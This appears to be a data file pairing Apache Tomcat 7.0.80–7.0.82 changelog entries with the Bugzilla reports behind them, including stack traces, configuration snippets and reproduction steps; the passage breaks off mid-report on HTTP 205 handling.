server.xml configure file

Environment:

OS: Red Hat Enterprise Linux Server release 6.7  2.6.32-573.el6.x86_64
JDK: version ""1.8.0_65"" Java HotSpot(TM) 64-Bit Server VM
Memory: 16G
CPU: 1
Tomcat:  tested 8.5.3 and 8.5.11
APR: 1.5.2-1


Test step:

1. Install tomcat
2. Test home page

./wrk -t2000 -c 2000 -d 100s http://testhost:8080/


Exception throws in catalina.log:

22-Mar-2017 09:09:04.344 WARNING [http-apr-8080-Poller] org.apache.tomcat.util.net.AprEndpoint$Poller.run Unexpected poller error
 java.lang.NullPointerException
        at org.apache.tomcat.util.net.AprEndpoint$AprSocketWrapper.access$400(AprEndpoint.java:2292)
        at org.apache.tomcat.util.net.AprEndpoint$Poller.run(AprEndpoint.java:1703)
        at java.lang.Thread.run(Thread.java:745)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=60900
Coyote|Tomcat 7.0.82 (violetagg)|add||Add an option to reject requests that contain HTTP headers with invalid (non-token) header names with a 400 response. (markt)|||
WebSocket|Tomcat 7.0.82 (violetagg)|fix|61491|When using the permessage-deflate extension, correctly handle the sending of empty messages after non-empty messages to avoid the IllegalArgumentException. (markt)|IllegalArgumentException thrown by PerMessageDeflate sendMessagePart()|"This issue is similar to https://bz.apache.org/bugzilla/show_bug.cgi?id=59635 but it is happending in another location of the code.   Please refer to the following stack.  

compressedPayload.limit() is zero because of the compressedPayload.flip() call.

Sep 04, 2017 11:10:08 PM org.glassfish.jersey.server.ServerRuntime$Responder writeResponse
SEVERE: Error while closing the output stream in order to commit response.
java.lang.IllegalArgumentException
	at java.nio.Buffer.limit(Unknown Source)
	at org.apache.tomcat.websocket.PerMessageDeflate.sendMessagePart(PerMessageDeflate.java:374)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.startMessage(WsRemoteEndpointImplBase.java:341)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase$TextMessageSendHandler.write(WsRemoteEndpointImplBase.java:803)
	at org.apache.tomcat.websocket.WsRemoteEndpointImplBase.sendStringByCompletion(WsRemoteEndpointImplBase.java:212)
	at org.apache.tomcat.websocket.WsRemoteEndpointAsync.sendText(WsRemoteEndpointAsync.java:47)
	at org.atmosphere.container.version.JSR356WebSocket.write(JSR356WebSocket.java:73)
	at org.atmosphere.websocket.WebSocket.write(WebSocket.java:255)
	at org.atmosphere.websocket.WebSocket.write(WebSocket.java:46)
	at org.atmosphere.cpr.AtmosphereResponseImpl$Stream.write(AtmosphereResponseImpl.java:980)
	at org.glassfish.jersey.servlet.internal.ResponseWriter$NonCloseableOutputStreamWrapper.write(ResponseWriter.java:325)
	at java.io.ByteArrayOutputStream.writeTo(Unknown Source)
	at org.glassfish.jersey.message.internal.CommittingOutputStream.flushBuffer(CommittingOutputStream.java:307)
	at org.glassfish.jersey.message.internal.CommittingOutputStream.commit(CommittingOutputStream.java:261)
	at org.glassfish.jersey.message.internal.CommittingOutputStream.close(CommittingOutputStream.java:276)
	at org.glassfish.jersey.message.internal.OutboundMessageContext.close(OutboundMessageContext.java:877)
	at org.glassfish.jersey.server.ContainerResponse.close(ContainerResponse.java:412)
	at org.glassfish.jersey.server.ServerRuntime$Responder.writeResponse(ServerRuntime.java:784)
	at org.glassfish.jersey.server.ServerRuntime$Responder.processResponse(ServerRuntime.java:444)
	at org.glassfish.jersey.server.ServerRuntime$Responder.process(ServerRuntime.java:434)
	at org.glassfish.jersey.server.ServerRuntime$2.run(ServerRuntime.java:329)
	at org.glassfish.jersey.internal.Errors$1.call(Errors.java:271)
	at org.glassfish.jersey.internal.Errors$1.call(Errors.java:267)
	at org.glassfish.jersey.internal.Errors.process(Errors.java:315)
	at org.glassfish.jersey.internal.Errors.process(Errors.java:297)
	at org.glassfish.jersey.internal.Errors.process(Errors.java:267)
	at org.glassfish.jersey.process.internal.RequestScope.runInScope(RequestScope.java:321)
	at org.glassfish.jersey.server.ServerRuntime.process(ServerRuntime.java:305)
	at org.glassfish.jersey.server.ApplicationHandler.handle(ApplicationHandler.java:1154)
	at org.glassfish.jersey.servlet.WebComponent.serviceImpl(WebComponent.java:473)
	at org.glassfish.jersey.servlet.WebComponent.service(WebComponent.java:427)
	at org.glassfish.jersey.servlet.ServletContainer.service(ServletContainer.java:388)
	at org.glassfish.jersey.servlet.ServletContainer.service(ServletContainer.java:341)
	at org.glassfish.jersey.servlet.ServletContainer.service(ServletContainer.java:228)
	at com.apriori.async.ws.config.AsyncServletContainer.service(AsyncServletContainer.java:108)
	at org.atmosphere.util.AtmosphereFilterChain.doFilter(AtmosphereFilterChain.java:135)
	at org.atmosphere.util.AtmosphereFilterChain.invokeFilterChain(AtmosphereFilterChain.java:96)
	at org.atmosphere.handler.ReflectorServletProcessor$FilterChainServletWrapper.service(ReflectorServletProcessor.java:337)
	at org.atmosphere.handler.ReflectorServletProcessor.onRequest(ReflectorServletProcessor.java:175)
	at org.atmosphere.cpr.AsynchronousProcessor.action(AsynchronousProcessor.java:223)
	at org.atmosphere.cpr.AsynchronousProcessor.suspended(AsynchronousProcessor.java:115)
	at org.atmosphere.container.Servlet30CometSupport.service(Servlet30CometSupport.java:67)
	at org.atmosphere.cpr.AtmosphereFramework.doCometSupport(AtmosphereFramework.java:2287)
	at org.atmosphere.websocket.DefaultWebSocketProcessor.dispatch(DefaultWebSocketProcessor.java:593)
	at org.atmosphere.websocket.DefaultWebSocketProcessor.open(DefaultWebSocketProcessor.java:224)
	at org.atmosphere.container.JSR356Endpoint.onOpen(JSR356Endpoint.java:264)
	at org.apache.tomcat.websocket.server.WsHttpUpgradeHandler.init(WsHttpUpgradeHandler.java:133)
	at org.apache.coyote.AbstractProtocol$ConnectionHandler.process(AbstractProtocol.java:914)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1457)
	at org.apache.tomcat.util.net.SocketProcessorBase.run(SocketProcessorBase.java:49)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(Unknown Source)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(Unknown Source)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Unknown Source)"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61491
Tribes|Tomcat 7.0.82 (violetagg)|fix||To avoid unexpected session timeout notification from backup session, update the access time when receiving the map member notification message. (kfujino)|||
Tribes|Tomcat 7.0.82 (violetagg)|fix||Add member info to the log message when the failure detection check fails in TcpFailureDetector. (kfujino)|||
Tribes|Tomcat 7.0.82 (violetagg)|fix||Avoid Ping timeout until the added map member by receiving MSG_START message is completely started. (kfujino)|||
Tribes|Tomcat 7.0.82 (violetagg)|fix||When sending a channel message, make sure that the Sender has connected. (kfujino)|||
Tribes|Tomcat 7.0.82 (violetagg)|fix||Correct the backup node selection logic that node 0 is returned twice consecutively. (kfujino)|||
Tribes|Tomcat 7.0.82 (violetagg)|fix||Fix race condition of responseMap in RpcChannel. (kfujino)|||
jdbc-pool|Tomcat 7.0.82 (violetagg)|fix|61391|Ensure that failed queries are logged if the SlowQueryReport interceptor is configured to do so and the connection has been abandoned. Patch provided by Craig Webb. (markt)|SlowQueryReport not logging Failed Query if connection abandoned|"In SlowQueryReport.reportFailedQuery() a change has been made to check if QueryStats is null before calling QueryStats.failure(). However, the logging is also included in this if block.

The logging should happen regardless of whether QueryStats is null or not, so that the SQL is logged.

Current code:
QueryStats qs = this.getQueryStats(sql);
if (qs != null) {
   qs.failure(delta, now);
   if (isLogFailed() && log.isWarnEnabled()) {
      log.warn(""Failed Query Report SQL=""+sql+""; time=""+delta+"" ms;"");
   }
}

Suggested fix:
QueryStats qs = this.getQueryStats(sql);
if (qs != null) {
   qs.failure(delta, now);
}
if (isLogFailed() && log.isWarnEnabled()) {
   log.warn(""Failed Query Report SQL=""+sql+""; time=""+delta+"" ms;"");
}"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61391
jdbc-pool|Tomcat 7.0.82 (violetagg)|fix|61425|Ensure that transaction of idle connection has terminated when the testWhileIdle is set to true and defaultAutoCommit is set to false. Patch provided by WangZheng. (kfujino)|all idle connections become '<IDLE> in transaction' when the 'testWhileIdle' is set to 'true' and 'defaultAutoCommit' is set to 'false'|"In my application, I use spring boot framework, and I choose ""Tomcat JDBC Pool"" as my connection pool, what I have configured is as follows.

spring.datasource.type=org.apache.tomcat.jdbc.pool.DataSource
spring.datasource.url=jdbc:postgresql://localhost:5432/test
spring.datasource.tomcat.driverClassName=org.postgresql.Driver
spring.datasource.tomcat.username=admin
spring.datasource.tomcat.password=admin
spring.datasource.tomcat.initialSize=15
spring.datasource.tomcat.min-idle=15
spring.datasource.tomcat.maxActive=30
spring.datasource.tomcat.max-idle=30
spring.datasource.tomcat.maxWait=300000
spring.datasource.tomcat.timeBetweenEvictionRunsMillis=30000
spring.datasource.tomcat.minEvictableIdleTimeMillis=60000
spring.datasource.tomcat.removeAbandoned=true
spring.datasource.tomcat.removeAbandonedTimeout=900
spring.datasource.tomcat.logAbandoned=true

spring.datasource.tomcat.testWhileIdle=true
spring.datasource.tomcat.validationQuery=SELECT 1
spring.datasource.tomcat.validationInterval=60000
spring.datasource.tomcat.default-auto-commit=false

Then I run my application, 60 seconds later, all the database connections become into ""<IDLE> in transaction"".

Why does this happen? I look into the ""PooledConnection.java"" source code, and I get the reason.

In the above configuration, I set the ""testWhileIdle"" to ""true"", so every connection in the pool will be tested to see if it is idle, using the specified SQL ""SELECT 1"".
After executing the SQL, the connection does not call commit() or rollback(). We know that if the connection is auto committed, this is OK.
But because I set the ""defaultAutoCommit"" to ""false"", so the connection will not be committed automatically, and so the connection will always stay in the status of ""<IDLE> in transaction"", and I think this is incorrect."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61425
jdbc-pool|Tomcat 7.0.82 (violetagg)|fix|61545|Correctly handle invocations of methods defined in the PooledConnection interface when using pooled XA connections. Patch provided by Nils Winkler. (markt)|ProxyConnection.invoke() does not handle javax.sql.PooledConnection method calls|"I've found an issue with tomcat-jdbc and XA connections, where Tomcat Pool's ProxyConnection class does not handle invocations done using the javax.sql.PooledConnection interface.

I'm seeing this with Tomcat v7.0.78, but the same code is used in Tomcat's 8.5 codebase. My use case involves the following setup:

* Database: MySQL, PostgreSQL or Oracle - same issue on all three of them.
* Tomcat Pool is used to define a context-specific XADataSource to be used by the web application.
* The web application uses Spring for setup, and Jencks as an XA transaction manager.
* Jencks uses tranql-connector under the hood (version 1.7 or 1.8 show the same behavior).

The issue can be seen from Tranql's code: http://grepcode.com/file/repo1.maven.org/maven2/org.tranql/tranql-connector/1.8/org/tranql/connector/jdbc/ManagedXAConnection.java?av=f#55

Here, tranql gets an XAConnection from the pool (Tomcat Pool in this case) and tries to set a ConnectionEventListener on the connection:

       this.xaConnection = xaConnection;
         xaConnection.addConnectionEventListener(new ConnectionEventListener() {
                     public void connectionClosed(ConnectionEvent event) {
                 //we should be handling this independently
             }
 
                     public void connectionErrorOccurred(ConnectionEvent event) {
                 Exception e = event.getSQLException();
                 unfilteredConnectionError(e);
             }
         });

The xaConnection.addConnectionEventListener gets propagated through the JdbcInterceptor hierarchy in Tomcat Pool, all the way to the ProxyConnection.invoke() method: http://svn.apache.org/viewvc/tomcat/trunk/modules/jdbc-pool/src/main/java/org/apache/tomcat/jdbc/pool/ProxyConnection.java?view=markup#l92

Since the addConnectionEventListener method is defined on javax.sql.PooledConnection, none of the if-clauses in the ProxyConnection.invoke() method match and the code finally ends up in line 126, where the ""addConnectionEventListener"" is invoked on the java.sql.Connection instance, which of course does not implement the javax.sql.PooledConnection interface: http://svn.apache.org/viewvc/tomcat/trunk/modules/jdbc-pool/src/main/java/org/apache/tomcat/jdbc/pool/ProxyConnection.java?view=markup#l126

PooledConnection poolc = connection;
if (poolc!=null) {
    return method.invoke(poolc.getConnection(),args);
} else {
    throw new SQLException(""Connection has already been closed."");
}

The error that is shown looks like this:

Caused by: java.lang.IllegalArgumentException: object is not an instance of declaring class
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:57)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:606)
	at org.apache.tomcat.jdbc.pool.ProxyConnection.invoke(ProxyConnection.java:126)
	at org.apache.tomcat.jdbc.pool.JdbcInterceptor.invoke(JdbcInterceptor.java:109)
	at org.apache.tomcat.jdbc.pool.interceptor.AbstractCreateStatementInterceptor.invoke(AbstractCreateStatementInterceptor.java:80)
	at org.apache.tomcat.jdbc.pool.JdbcInterceptor.invoke(JdbcInterceptor.java:109)
	at org.apache.tomcat.jdbc.pool.interceptor.AbstractCreateStatementInterceptor.invoke(AbstractCreateStatementInterceptor.java:80)
	at org.apache.tomcat.jdbc.pool.JdbcInterceptor.invoke(JdbcInterceptor.java:109)
	at org.apache.tomcat.jdbc.pool.interceptor.ConnectionState.invoke(ConnectionState.java:153)
	at org.apache.tomcat.jdbc.pool.JdbcInterceptor.invoke(JdbcInterceptor.java:109)
	at org.apache.tomcat.jdbc.pool.TrapException.invoke(TrapException.java:41)
	... 111 more

In the case of Oracle, the ""poolc.getConnection()"" call returns an instance of oracle.jdbc.driver.LogicalConnection, which does not implement javax.sql.PooledConnection.

Since javax.sql.XAConnection extends the javax.sql.PooledConnection interface, the reason for the error stems from the check in line 106 of ProxyConnection.java: http://svn.apache.org/viewvc/tomcat/trunk/modules/jdbc-pool/src/main/java/org/apache/tomcat/jdbc/pool/ProxyConnection.java?view=markup#l106

} else if (method.getDeclaringClass().equals(XAConnection.class)) {
    try {
        return method.invoke(connection.getXAConnection(),args);
    }catch (Throwable t) {

The code does the right thing (using the ""connection.getXAConnection()"" instance to invoke calls that are supposed to be done on an XAConnection, but it fails to account for the fact that javax.sql.XAConnection also extends the javax.sql.PooledConnection interface. Due to this incomplete check, the call to javax.sql.PooledConnection.addConnectionEventListener() is not detected here, but falls through to the call in line 126.

The code in line 106 should be changed to not only check for calls made to XAConnection, but also include methods defined in super-classes (or super-interfaces) of XAConnection:

} else if (method.getDeclaringClass().isAssignableFrom(XAConnection.class)) {


Using ""isAssignableFrom"" instead of ""equals"" accomplishes that.

Sorry for the long description - let me know if there are any questions or require a unit test case and/or a patch for fixing this issue."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61545
Other|Tomcat 7.0.82 (violetagg)|fix|61439|Remove the Java Annotation API classes from tomcat-embed-core.jar and package them in a separate JAR in the embedded distribution to provide end users with greater flexibility to handle potential conflicts with the JRE and/or other JARs. (markt)|Stop shipping JavaEE APIs as part as tomcat-embed-core|"This relates to #59899 and the support of Java9 which is summarized in this Spring Boot issue: https://github.com/spring-projects/spring-boot/issues/9366

Essentially, we are wondering if you would consider stop shipping JavaEE APIs and rather rely on official JAR(s). That way, we (and anyone) could apply regular build exclusion in case we are shipping it ourselves or if we want to provide a more recent version."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61439
Other|Tomcat 7.0.82 (violetagg)|fix|61441|Improve the detection of JAVA_HOME by the daemon.sh script when running on a platform where Java has been installed from an RPM. (rjung)|daemon.sh's auto-detection fails on linux system's where java is installed via an RPM|"On RHEL/Centos/Fedora, when java is installed from the RPMs neither JAVA_HOME nor JRE_HOME environment variables are set. Luckily, the Tomcat startup scripts are able to auto-detect them but the daemon.sh script cannot properly do so. The failure is in the JAVA_HOME auto-detection in the script here:

daemon.sh:96:

~~~
JAVA_BIN=""`which java 2>/dev/null || type java 2>&1`""
test -x ""$JAVA_BIN"" && JAVA_HOME=""`dirname $JAVA_BIN`""
test "".$JAVA_HOME"" != . && JAVA_HOME=`cd ""$JAVA_HOME/.."" >/dev/null; pwd`
~~~

The problem is that when java is installed from the RPMs, `which java` evaluates to '/usr/bin/java', which is a symlink maintained by alternatives. The code snippet above will evaluate to JAVA_HOME and JRE_HOME being set to '/usr'. Having JRE_HOME set to '/usr' doesn't seem to cause problems for Tomcat, but the problem manifests itself when running the daemon.sh script:

~~~
# ./daemon.sh start
Cannot find any VM in Java Home /usr
~~~
 
jsvc is only used in daemon.sh, therefore this problem was not seen when starting Tomcat using startup.sh or catalina.sh.

I think a good fallback for JAVA_HOME and JRE_HOME is '/usr/lib/jvm/java' and '/usr/lib/jvm/jre' respectively.

To Reproduce:

1. Install tomcat
2. Install java from RPMs
3. cd $CATALINA_HOME
4. bin/daemon.sh start
5. Observe error mentioned above"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61441
Other|Tomcat 7.0.82 (violetagg)|update||Update the packaged version of the Tomcat Native Library to 1.2.14 to pick up the latest Windows binaries built with APR 1.6.2 and OpenSSL 1.0.2l. (markt)|||
Other|Tomcat 7.0.82 (violetagg)|fix||Update fix for 59904 so that values less than zero are accepted instead of throwing a NegativeArraySizeException. (remm)|memory leak--ServerCookie|"heap dump:

Class Name	                        Objects	 Shallow Heap	Retained Heap
org.apache.tomcat.util.buf.ByteChunk	13220789 634597872	>=643312600
org.apache.tomcat.util.buf.MessageBytes 13194914 633355872	>=1801383536
org.apache.tomcat.util.buf.CharChunk	13204864 528194560	>=569456560
org.apache.tomcat.util.http.ServerCookie 2579614 123821472	>=1879787624


million+ ServerCookie objects in the heap,it cause memery leak.

org.apache.coyote.Request objcet contain a ServerCookies,it is a ServerCookie array,and the array length is 2048. 


so i have a test



		GetMethod getMethod = new GetMethod(""http://127.0.0.1:8080/"");

		Header h = new Header();
		h.setName(""Cookie"");
		StringBuilder sb=new StringBuilder();
		for(int i=0;i<2000;i++){
			sb.append(""a=b;"");
		}
		h.setValue(sb.toString());
		getMethod.addRequestHeader(h);

		int statusCode = httpClient.executeMethod(getMethod);


debug and get two thousand cookies in the request,and ServerCookie arrays is cached in heap.

we hava maxHeaderCount and maxHttpHeaderSize,but Cookie just as one header
so we need maxCookieCount too."|https://bz.apache.org/bugzilla/show_bug.cgi?id=59904
Other|Tomcat 7.0.82 (violetagg)|fix|61563|Correct typos in Spanish translation. Patch provided by Gonzalo V√°squez. (csutherl)|Typo for entry managerServlet.listed at org/apache/catalina/manager/LocalStrings_es.properties|"Created attachment 35374 [details]
typo fixes

Two minor typos are present, for which I've included a small patch"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61563
Catalina|Tomcat 7.0.81 (violetagg)|fix||Correct regression in 7.0.80 that broke WebDAV. (markt)|||
Catalina|Tomcat 7.0.80 (violetagg)|fix|56785|Avoid NullPointerException if directory exists on the class path that is not readable by the Tomcat user. (markt)|NullPointer in processAnnotationsFile during Application Startup|"Hello,

we go the following exception in Aplicaiton startup. 

java.lang.NullPointerException
        at org.apache.catalina.startup.ContextConfig.processAnnotationsFile(ContextConfig.java:1966)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsFile(ContextConfig.java:1967)
        at org.apache.catalina.startup.ContextConfig.processAnnotationsUrl(ContextConfig.java:1920)
        at org.apache.catalina.startup.ContextConfig.processAnnotations(ContextConfig.java:1878)
        at org.apache.catalina.startup.ContextConfig.webConfig(ContextConfig.java:1146)
        at org.apache.catalina.startup.ContextConfig.configureStart(ContextConfig.java:768)
        at org.apache.catalina.startup.ContextConfig.lifecycleEvent(ContextConfig.java:303)
        at org.apache.catalina.util.LifecycleSupport.fireLifecycleEvent(LifecycleSupport.java:117)
        at org.apache.catalina.util.LifecycleBase.fireLifecycleEvent(LifecycleBase.java:90)
        at org.apache.catalina.core.StandardContext.startInternal(StandardContext.java:5069)
        at org.apache.catalina.util.LifecycleBase.start(LifecycleBase.java:150)
        ... 6 more

The reason was that we added -Duser.dir=<customDir> to give Tomcat a uniqe working dir. Within our <customDir> there was a directory which was not accessible for the tomcat user. It belongs to root and no one else has access. So tomcat tries to scan the user.dir and tries to list files within the restricted dir. 

Doing so ths file.listFiles() command retuns null (instead of a list of files) which is not correctly handled and causing this Nullpointer and preventing the Server from startup.

to recrate set -Duser.dir in setenv.sh to /tmp, create a folder /tmp/test, give permission 700 to /tmp/test, chwon root:root /tmp/test and start a tomcat with at least one application and a user other than root.

The fix would be to correctly handle nullpointers or to simply write a meningfull log message. 

Kind regards 
Juergen Sussner"|https://bz.apache.org/bugzilla/show_bug.cgi?id=56785
Catalina|Tomcat 7.0.80 (violetagg)|fix||Additional permission for deleting files is granted to JULI as it is required by FileHandler when running under a Security Manager. The thread that cleans the log files is marked as daemon thread. (violetagg)|||
Catalina|Tomcat 7.0.80 (violetagg)|fix|61229|Correct a regression in 7.0.78 that broke WebDAV handling for resources with names that included a & character. (markt)|WebDAV listings fails when a file contains ampersand &|"Created attachment 35080 [details]
webapps webdav folder

See the attached test WebDAV folder (webdav.zip). If the WebDAV folder contains a file with an ampersand in the filename, you cannot access the folder at all with WebDAV. I can reproduce it with AnyClient from JSCAPE (in our own product we use jackrabbit for WebDAV access).

Full repro steps:
- JAVA_HOME is 1.8.0_121
- Extract apache-tomcat-8.5.15.zip to a working folder.
- In the webapps directory extract contents of webapps.zip (see attachment)
- In apache-tomcat-8.5.15\bin run: catalina.bat start
- In AnyClient configure a new connection in Site Manager:
-- Host: http://localhost:8080/webdav
-- Protocol: WebDAV
- Connect, click the refresh button, and notice the listing remains empty.
- In a file manager go to webapps\webdav and rename test&.txt to test.txt.
- Get the directory listing again, and notice that it works now.

I tried three Tomcat versions:
8.5.15: has this bug
8.5.14: works fine
7.0.78: works fine

Note that you see the problem only if you access the directory with a WebDAV client, getting the directory listing in a browser works fine."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61229
Catalina|Tomcat 7.0.80 (violetagg)|add||If the Content-Language HTTP header is set directly, attempt to determine the Locale from the header value and call ServletResponse.setLocale() with the derived Locale. (markt)|||
Catalina|Tomcat 7.0.80 (violetagg)|fix|61232|When log rotation is disabled only one separator will be used when generating the log file name. For example if the prefix is catalina. and the suffix is .log then the log file name will be catalina.log instead of catalina..log. Patch provided by Katya Stoycheva. (violetagg)|Disabling rotation on the FileHandler creates 'catalina..log' instead of 'catalina.log'|"This is a trivial thing, but I thought it a good Beginner issue (unless someone thinks that this is expected behavior).

When you disable rotatable in the default logging.properties tomcat creates 'catalina..log' rather than the correct 'catalina.log' file. There is no functional issue, but it seems kinda buggy to do that. You can easily workaround it by overriding the default suffix with ""1catalina.org.apache.juli.AsyncFileHandler.suffix=log"".

To reproduce:

1) Install tomcat
2) Disable log rotation

$ echo ""1catalina.org.apache.juli.AsyncFileHandler.rotatable = false"" >> conf/logging.properties

3) Start tomcat

bin/startup.sh

4) Check the logs directory for catalina log with double '.'s:

$ ll logs/catalina.*log
-rw-r-----. 1 coty coty 7796 Jun 28 13:58 logs/catalina..log"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61232
Catalina|Tomcat 7.0.80 (violetagg)|fix|61253|Add warn message when Digester.updateAttributes throws an exception instead of ignoring it. (csutherl)|Tomcat's Digester silently ignore's failed property replacement|"I don't see much of a problem with this for vanilla tomcat, but if you're using a PropertySource implementation with org.apache.tomcat.util.digester.PROPERTY_SOURCE and it bombs somehow, the Digester quietly eats the exception leaving the developer/user clueless.

Could we log a warn message in the catch block here https://github.com/apache/tomcat85/blob/trunk/java/org/apache/tomcat/util/digester/Digester.java#L1990 saying that the replacement failed and that the property was not updated?"|https://bz.apache.org/bugzilla/show_bug.cgi?id=61253
Catalina|Tomcat 7.0.80 (violetagg)|fix|61313|Make the read timeout configurable in the JNDIRealm and ensure that a read timeout will result in an attempt to fail over to the alternateURL. Based on patches by Peter Maloney and Felix Schumacher. (markt)|JNDIRealm LDAP server failover to alternateURL takes very long 15m32s|"Created attachment 35146 [details]
my hacky patch

I have worked with ‚Äécsutherl‚Äé on #tomcat on irc.freenode.net who decided this is a bug and should be reported here rather than the ML.

JDK version tested was oracle JDK 1.8.0_66.

I have set connectionURL and alternateURL to try to get LDAP server failover to work.

If both servers are up, it ""works well"".
If only the connectionURL server is down (firewall is set to REJECT) then a newly restarted tomcat works fine, but if it goes down while tomcat is already running, the next LDAP lookup takes 15m32s.
If only the alternateURL server is down (firewall is set to REJECT) then a newly restarted tomcat works fine, but if it goes down while tomcat is already running, and the connectionURL server was down before but up again now (so the JNDIRealm's instance variable ""context"" is currently set using alternateURL) the next LDAP lookup takes 15m32s.

Setting connectionTimeout has no effect on the time. I have verified it ends up in the Hashtable returned by getDirectoryContextEnvironment().

And if I apply my hacky patch (attached, applies to tomcat85 git repo, tag TOMCAT_8_5_16) for the method ""JNDIRealm.open()"" so it works like a fresh tomcat startup, and never returns the old context (closes it and sets it to null, then lets the rest of the code run), it always ""works well"", taking 4-7s on a fresh tomcat, or less than 0.1s on a warmed up tomcat.

server.xml snippets:

    <Realm className=""org.apache.catalina.realm.MemoryRealm"" digest=""MD5"" />
    </Realm>
    
    <Realm className=""org.apache.catalina.realm.JNDIRealm""
        connectionURL=""ldap://auth1:389""
        connectionTimeout=""1000""
        connectionAttempt=""0""
        alternateURL=""ldap://auth2:389""
        userPattern=""uid={0},ou=People,dc=example,dc=com""
        userRoleAttribute=""gidNumber""
        roleBase=""ou=Group,dc=example,dc=com""
        roleName=""cn""
        roleSearch=""(|(gidNumber={2})(memberUid={1}))""
        />

an example webapp that can be used for testing is attached

firewall test code (assuming otherwise blank firewall with policy ACCEPT):
    t() { iptables -D INPUT 1 ; iptables -I INPUT 1 -p tcp -s 10.3.0.21 -j ""$1"" ; iptables -nvL; }
    
    # run this on machines that should work
    t LOG
    # run this on machines that should fail
    t REJECT
    
the test:
    # prerequisite for the test is a server named ""auth1"" and another ""auth2"" which run on port 389. In our case it's slapd, and they have start_tls enabled but not required.
    # on both LDAP servers:
    t LOG

    # then start tomcat, then
    # on the first LDAP server:
    t REJECT

    # on a test machine (content of the user and password here shouldn't matter... we aren't testing authentication, only time taken)
    time curl --user someuser:somepassword http://exampledomain:8080/dummy-service/test/ldap

    (ignore response, but look at time taken)

result:
    Almost always takes 15m32.4s plus up to 4s or so, but usually within a few ms.
    When it ""works well"" (described in detail above), the first run takes about 4-7s, and after that it takes around 0.02s to 0.1s.
    
expected:
    It should always be quick, within some small multiple of the connection timeout, preferrably 1x. So in this case, it should take about 1s extra, or at most a few seconds, so 1.1s on a warmed up tomcat.

Side comment: other LDAP clients support an arbitrary number of urls, or one line with all the urls together... I find it limiting to have only 2 that you can set here. We have 3 LDAP servers."|https://bz.apache.org/bugzilla/show_bug.cgi?id=61313
Coyote|Tomcat 7.0.80 (violetagg)|fix|61086|Ensure to explicitly signal an empty request body for HTTP 205 responses. Additional fix to r1795278. Based on a patch provided by Alexandr Saperov. (violetagg)|Some clients hang when HTTP responses give status 205 Reset Content|"Created attachment 34992 [details]
Exemple standalone servlet to give out HTTP 205 response

When a servlet running on Tomcat sends a response over HTTP with status 205 Reset Content, some clients hang with this response and just wait for it to ""complete"" after Tomcat considers it fully done.

So far I've identified two clients:
- command line program curl, version 7.52.1,
- Jersey client, version 1.19.1.

Using Tomcat 8.5.15 (latest release), but the issue was here for as long as I went back and it seems still here in Tomcat 9.

Debugging the HTTP communication shows it has to do with the fact that the response has no body (which is correct, as mandated by RFC for status 205), and no indication of content length to explicitly say that there is no body. That last part is incorrect behavior according to RFC 7231 section 6.3.6:

   "" Since the 205 status code implies that no additional content will be provided, a server MUST NOT generate a payload in a 205 response.  In other words, a server MUST do one of the following for a 205 response: a) indicate a zero-length body for the response by including a Content-Length header field with a value of 0; b) indicate a zero-length payload for the response by including a Transfer-Encoding header field with a value of chunked and a message body consisting of a single chunk of zero-length; or, c) close the connection immediately after sending the blank line terminating the header section. ""

It seems the HTTP clients I've identified, do rely on this requirement stated by RFC. Testing with servers that do add a Content-Length: 0 header or a Transfer-encoding chunked with a zero-length chunk with a status 205, these clients behave as expected. Also note, that Tomcat will typically eventually reach its keep-alive timeout and close the connection. Which is actually a valid way to end the response, and these clients do accept it when they don't reach their own timeouts. It's just the response takes by default 20 seconds to be finished, and is done with closing a perfectly re-usable connection.

Steps to reproduce:

 (1) Have a clean Tomcat install version 8.5.15

 (2) Deploy on it a root webapp that responds to requests with
     HTTP status 205.

     You can use the standalone servlet class I put in attachment.
     As can be seen, it responds to all requests with status 205,
     and it adds a custom header just to be sure the response comes
     from this servlet.

 (3) Make an HTTP request to it with curl.

     Response looks like:

$ curl -v http://localhost:8080
* STATE: INIT => CONNECT handle 0x6000578f0; line 1413 (connection #-5000)
* Rebuilt URL to: http://localhost:8080/
* Added connection 0. The cache now contains 1 members
*   Trying 127.0.0.1...
* TCP_NODELAY set
* STATE: CONNECT => WAITCONNECT handle 0x6000578f0; line 1466 (connection #0)
* Connected to localhost (127.0.0.1) port 8080 (#0)
* STATE: WAITCONNECT => SENDPROTOCONNECT handle 0x6000578f0; line 1583 (connection #0)
* Marked for [keep alive]: HTTP default
* STATE: SENDPROTOCONNECT => DO handle 0x6000578f0; line 1601 (connection #0)
> GET / HTTP/1.1
> Host: localhost:8080
> User-Agent: curl/7.52.1
> Accept: */*
>
* STATE: DO => DO_DONE handle 0x6000578f0; line 1680 (connection #0)
* STATE: DO_DONE => WAITPERFORM handle 0x6000578f0; line 1807 (connection #0)
* STATE: WAITPERFORM => PERFORM handle 0x6000578f0; line 1817 (connection #0)
* HTTP 1.1 or later with persistent connection, pipelining supported
< HTTP/1.1 205
< x-mmar-servletname: return205
< Date: Thu, 11 May 2017 15:43:26 GMT
* no chunk, no close, no size. Assume close to signal end
* Marked for [closure]: HTTP: No end-of-message indicator
<
* STATE: PERFORM => DONE handle 0x6000578f0; line 1981 (connection #0)
* multi_done
* Curl_http_done: called premature == 0
* Closing connection 0
* The cache now contains 0 members

     curl hangs for a while after ""Marked for [closure]: HTTP: No end-of-message indicator"".
     Then after 20 seconds Tomcat reaches connection
